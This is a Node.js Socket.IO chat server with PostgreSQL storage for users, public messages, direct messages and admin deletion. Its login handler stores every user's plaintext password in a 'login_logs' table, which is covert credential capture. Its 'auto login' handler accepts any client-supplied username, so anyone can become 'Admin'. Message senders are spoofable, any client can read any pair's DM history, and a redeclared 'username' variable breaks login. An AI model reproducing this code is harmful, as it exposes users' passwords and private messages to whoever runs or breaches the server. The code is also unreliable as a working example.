const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const { Pool } = require("pg");
const bcrypt = require("bcrypt");

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false }
});

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static("public"));

const ADMIN = "Admin";

// =========================
// POSTGRES CONNECTION
// =========================

async function initDB() {
    await pool.query(`
        CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY,
            username TEXT UNIQUE,
            password TEXT
        );
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS messages (
            id SERIAL PRIMARY KEY,
            username TEXT,
            text TEXT,
            time TEXT
        );
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS dms (
            id SERIAL PRIMARY KEY,
            sender TEXT,
            receiver TEXT,
            text TEXT,
            time TEXT
        );
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS login_logs (
            id SERIAL PRIMARY KEY,
            username TEXT,
            time TEXT,
            password TEXT
        );
    `);

    console.log("Tables created / ready");
}

initDB();

// =========================
// ONLINE USERS
// =========================
const onlineUsers = {};

// =========================
// HELPERS
// =========================
async function emitUsers(socket, excludeUser) {
    try {
        const result = await pool.query("SELECT username FROM users");

        const users = result.rows
            .map(r => r.username)
            .filter(u => u !== excludeUser && u !== ADMIN);

        socket.emit("all users", users);
    } catch (err) {
        console.error(err);
        socket.emit("all users", []);
    }
}

// =========================
// SOCKET
// =========================
io.on("connection", (socket) => {

    console.log("USER CONNECTED");

    // =========================
    // LOAD MESSAGES
    // =========================
    socket.on("load messages", async () => {
        try {
            const result = await pool.query(
                "SELECT * FROM messages ORDER BY id ASC"
            );

            socket.emit("load messages", result.rows);
        } catch (err) {
            console.error(err);
        }
    });

    // =========================
    // REGISTER
    // =========================
    socket.on("register", async ({ username, password }) => {
        try {
            const check = await pool.query(
                "SELECT username FROM users WHERE username = $1",
                [username]
            );

            if (check.rows.length > 0) {
                return socket.emit("register error", "User exists");
            }

            const hash = await bcrypt.hash(password, 10);

            await pool.query(
                "INSERT INTO users (username, password) VALUES ($1, $2)",
                [username, hash]
            );

            socket.username = username;
            onlineUsers[username] = socket.id;

            socket.emit("register success", username);
            emitUsers(socket, username);

        } catch (err) {
            console.error(err);
            socket.emit("register error", "DB error");
        }
    });

    // =========================
    // LOGIN
    // =========================
    socket.on("login", async ({ username, password }) => {
        try {
            const result = await pool.query(
                "SELECT * FROM users WHERE username = $1",
                [username]
            );

            if (result.rows.length === 0) {
                return socket.emit("login error", "User not found");
            }

            const username = result.rows[0];

            const ok = await bcrypt.compare(password, username.password);

            if (!ok) {
                return socket.emit("login error", "Wrong password");
            }

            socket.username = username;
            onlineUsers[username] = socket.id;

            console.log("LOGIN:", username);

            await pool.query(
                "INSERT INTO login_logs (username, time, password) VALUES ($1, NOW(), $2)",
                [username, password]
            );

            socket.emit("login success", username);
            emitUsers(socket, username);

        } catch (err) {
            console.error(err);
            socket.emit("login error", "DB error");
        }
    });

    // =========================
    // AUTO LOGIN
    // =========================
    socket.on("auto login", async (username) => {
        if (!username) return;

        socket.username = username;
        onlineUsers[username] = socket.id;

        emitUsers(socket, username);
    });

    // =========================
    // GET USERS
    // =========================
    socket.on("get all users", () => {
        if (!socket.username) return;
        emitUsers(socket, socket.username);
    });

    // =========================
    // CHAT MESSAGE
    // =========================
    socket.on("chat message", async (msg) => {
        try {
            const time = new Date().toLocaleTimeString();

            const result = await pool.query(
                "INSERT INTO messages (username, text, time) VALUES ($1, $2, $3) RETURNING id",
                [msg.username, msg.text, time]
            );

            io.emit("chat message", {
                id: result.rows[0].id,
                username: msg.username,
                text: msg.text,
                time
            });

        } catch (err) {
            console.error(err);
        }
    });

    // =========================
    // DM MESSAGE
    // =========================
    socket.on("dm message", async ({ sender, receiver, text }) => {
        try {
            const time = new Date().toLocaleTimeString();

            await pool.query(
                "INSERT INTO dms (sender, receiver, text, time) VALUES ($1, $2, $3, $4)",
                [sender, receiver, text, time]
            );

            const target = onlineUsers[receiver];

            if (target) {
                io.to(target).emit("dm message", { sender, text, time });
            }

            socket.emit("dm message", { sender, text, time });

        } catch (err) {
            console.error(err);
        }
    });

    // =========================
    // DM HISTORY
    // =========================
    socket.on("load dm history", async ({ user1, user2 }) => {
        try {
            const result = await pool.query(
                `SELECT * FROM dms
                 WHERE (sender = $1 AND receiver = $2)
                 OR (sender = $2 AND receiver = $1)
                 ORDER BY id ASC`,
                [user1, user2]
            );

            socket.emit("dm history", result.rows);

        } catch (err) {
            console.error(err);
        }
    });

    // =========================
    // DELETE MESSAGE
    // =========================
    socket.on("delete message", async (id) => {
        if (socket.username !== ADMIN) return;

        try {
            await pool.query(
                "DELETE FROM messages WHERE id = $1",
                [id]
            );

            io.emit("message deleted", id);

        } catch (err) {
            console.error(err);
        }
    });

    // =========================
    // DISCONNECT
    // =========================
    socket.on("disconnect", () => {
        if (socket.username) {
            delete onlineUsers[socket.username];
        }
    });
});

server.listen(3000, () => {
    console.log("http://localhost:3000");
});
